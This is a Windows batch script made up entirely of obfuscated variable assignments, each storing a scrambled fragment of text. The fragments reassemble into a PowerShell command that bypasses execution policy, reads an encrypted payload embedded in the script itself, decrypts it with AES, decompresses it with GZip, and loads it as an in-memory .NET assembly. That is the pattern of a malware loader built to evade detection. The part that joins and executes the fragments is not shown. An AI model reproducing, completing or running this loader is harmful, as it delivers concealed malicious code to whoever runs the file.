@echo off
set "ZkdvLYQHyu=ddin"
set "JnlnvwlnrF=-joi"
set "oIploFljoZ= = $"
set "ogJMDncXZK=R.En"
set "WjpSMTGdkN=16] "
set "lAMGmtGwME=embl"
set "bterfRjvUz=SMFg"
set "MLYWaOBBpR=SMFg"
set "rmOUZHkHAG=saBm"
set "guupVdmGiU=mory"
set "hoKtezHXFW=bypa"
set "hiwxBGtvQR=PTtG"
set "MlXMXYezTS=tsWi"
set "NaggGHeZrR=[Sys"
set "EnodwHdiDK=n ''"
set "RlJJAHVfHH=rity"
set "EvLlGgelFS=)))"
set "xwbaJhxdjL=qLBU"
set "hLQZZujPhs=[]] "
set "iUZnbngKKE=y.Pa"
set "YJUOJgvlSP=-1.."
set "gWyMjdXSUd=PxEW"
set "ioKExpSxyt=m.IO"
set "jtWfffqcUk=AoyU"
set "CwHKuGlGAF=ateD"
set "PozfzLCUUI=ert]"
set "HhpvzCgohN=fore"
set "EJNEKsPUEi=DLa "
set "JmjRAMQJiq=::De"
set "QtPcuAZNAQ=em.I"
set "FCrKDyWILs=qLBU"
set "wXTUuIPdhY==');"
set "cUBvKHqPza=gMod"
set "luhqHCGRaG=and "
set "xwepGIuAvc=RmAx"
set "jhRtbrOoHU= if "
set "stObZvgzrX=dj0C"
set "hZkZSezRKJ=.Ass"
set "brMeerwfeu=g.Pa"
set "PywTltrCNq=ew-O"
set "IRUfkJzorH=onve"
set "DnjETcQxSA=oyU."
set "WrkqDDqPkJ=raph"
set "TfaxtuMcdR=y.Cr"
set "TRpvGHEaEm=ptog"
set "oGJoaxFqtY=m.Re"
set "csLoggKjPT=bjec"
set "nsFFVUjrrg=B = "
set "tgVBOwwYcr=comp"
set "GwNwXBPpmD=ach "
set "uDlBQbWYMB=gjYA"
set "AmszPMXsEF=tem."
set "oAtLhIfwPg=WFR "
set "rJcIGmXBOH=-ep "
set "oIGJdbZawT=urit"
set "GQrBDdZLVb=rans"
set "tQxVCcmiFo=d;$u"
set "sDJAGLIWdv=v = "
set "PuddWZsceN=$kIb"
set "SZecdgBMoT=)($t"
set "gIdXvIRzgK=ewLi"
set "GwpqblMmae=tS46"
set "FvSeTWOcdR=O.Me"
set "ggtlcDXPuk=r, 0"
set "ySLebGSZof=.Dis"
set "jxnyXiXbLM=$lKG"
set "hfXlQlcllW= [Sy"
set "ErqZDSOXDR=ss -"
set "SpKaNJjZUp=3); "
set "tfgSvIFMbG=zHhH"
set "TRXopcRNzn='')("
set "oTDWrZeZUq=ose("
set "iUvalmtQrM=File"
set "pvUYRNstPM=nirt"
set "zMKxwXfmkR=('%~f0'"
set "yIZSukIsrT=oint"
set "UOUYXeeeXs=comm"
set "BVxlfUJcJW=bB.D"
set "OgMDFjWVXP=rofi"
set "RmvbnMRJSg=Secu"
set "lQHEakhWGu=gnir"
set "uSKgMvIAZe=$aGH"
set "yNblETEjzM=lWE."
set "GUbHsiwKrk=106u"
set "IHJLBFbGpR=ck($"
set "TpSSWZsIyT=lWE "
set "kSnImLGOve=ment"
set "XhmtgCBsAv=m(, "
set "oMATRDTAZN= New"
set "BMebHohscf=Comp"
set "MPfbqTKQDW=ecry"
set "QRGmTLBywo=XV.T"
set "PeqGBvnsvk=  $t"
set "afYAVRFmXU=ress"
set "ExzhkDVURg=rity"
set "TphJRLVWVU=Br ="
set "XZbAGtuSeK=ay()"
set "bHoPPPYeAJ=zuZI"
set "jqDTWDWTsK=Fina"
set "odxBoqdoBu=();$"
set "xVpOAlWFPG=);$a"
set "CpEBrOsbzY=KGBr"
set "PbXGViYDIb=;$PA"
set "bpNGhzOODV=XV);"
set "tkAQZBtxSo=, (,"
set "dyXOEJAQHa=XV ="
set "QoFNQBglnD=ptor"
set "ADmWFisLJI=..-1"
set "anNMrwFuea=orF'"
set "KSjjNBAEGm=kIbi"
set "leZQgFkkMT=lKGB"
set "vnxCxxsGZX=s75K"
set "ZldLFnRUTT=r = "
set "fVjPDzYRMA=eam("
set "UKLeNCHRsr=, $l"
set "EgjUHdzbHL=vert"
set "VLlAMMDWdo=Stre"
set "vNGUPZHVeo=morF"
set "vkmshCnxIY=.Len"
set "UnCdjDimlh=pher"
set "CcjlfWQasb=();$"
set "PMfCysxiNF=bstr"
set "WCQwZOEYiQ=]::C"
set "KhVtxmQnaP=::('"
set "AXoalTZfoX=$Dnw"
set "WIFIkocXXB=stem"
set "lUPfzvgFOh=th('"
set "WBcEMnZSyv=.GZi"
set "kgtNfSBecI=k; }"
set "ttQchBBHHh=CFxo"
set "HYcfPwrdxZ=KGBr"
set "ZpAIInQooF=)) {"
set "AIUisZWodS=ddin"
set "DaHdoewkjq=Obje"
set "bikowTGdKO= [st"
set "nXdXZNEAAl=flec"
set "PBpCTVWAhJ=pose"
set "zvmmcomPXg=yste"
set "eNlnBIrEjV=ypto"
set "UPxXoKcnwI=tem."
set "woqXSJmZSp=bv, "
set "yjuIUCCdsw=form"
set "JlNCqucuEM=gsYZ"
set "cgWiFFeSIb=ing("
set "RIOkyUlaNE=.Mod"
set "CifgRMghmb=n ''"
set "FlxjPLQQuF=yTo("
set "CVaJfCVpUL=lKGB"
set "qZLDOlppfn=jZWF"
set "NtvMEZiuww=Dnwb"
set "HcMsGntECu=7;$u"
set "NaxeSrCVLQ=TllA"
set "AZtWrIsEMa=$meD"
set "YipdgNfurT=1] -"
set "LJaApPhnkX=Fg.I"
set "tPlsOsqlTY===')"
set "UdoceEalUa=Bmor"
set "SghWsEQyjN=oryS"
set "ZVmEnJIRsn=lBlo"
set "FnyZvkJEUv=Syst"
set "FRrjsIohsi=WolW"
set "bvEvOLWPpl=);$u"
set "sGwUmCOKqT=.Sec"
set "mXaqoSPgYO=sion"
set "kZbIomxUzo=-nop"
set "PFwUyPiXQZ='0Pg"
set "waplonfjoj=YxVw"
set "pNyvxrAlCp=t Sy"
set "mwWHPrboae=iron"
set "SGGEvNhcby=em.C"
set "bUoINmLBrQ=m.IO"
set "yvRWJAceOO=; };"
set "ACSkzlaHKb=Conv"
set "KkzqOFgHtg=tion"
set "XUforJygoM=rtS4"
set "hUUJriFBJx=.Key"
set "AXsQRFYzCp=$aGH"
set "oQnfQiKDsD=6esa"
set "DPUJaobWFi=grap"
set "PAjeZTzkwu=g = "
set "DIjuZTPvAc=6] -"
set "xZibtpdnOi=.Com"
set "DHBLOgRCBn=;$Dn"
set "DwxSnqKfXR== $u"
set "PLfHJNruhr=wbv."
set "RztWOUvVoh=rt]:"
set "uDamLjkasa= [Sy"
set "ojjtJpdzEJ=Disp"
set "BUpZLnxbYD=PKCS"
set "qJuMraBflQ=yste"
set "ZAgdEPayNV=.Cry"
set "ubJblvgPsB=pres"
set "qRFaNlGBxm=F'[-"
set "HmleWIzzxC=gth)"
set "AbhBMRAKoH= '')"
set "vfpgZqjJeW=ionM"
set "TafXaGNIwG='gni"
set "WHmWkJRoSL=);$P"
set "rosSNrsSQo=GHXV"
set "NyRiUJjjkp=SMFg"
set "QIaWQNSVQX=stem"
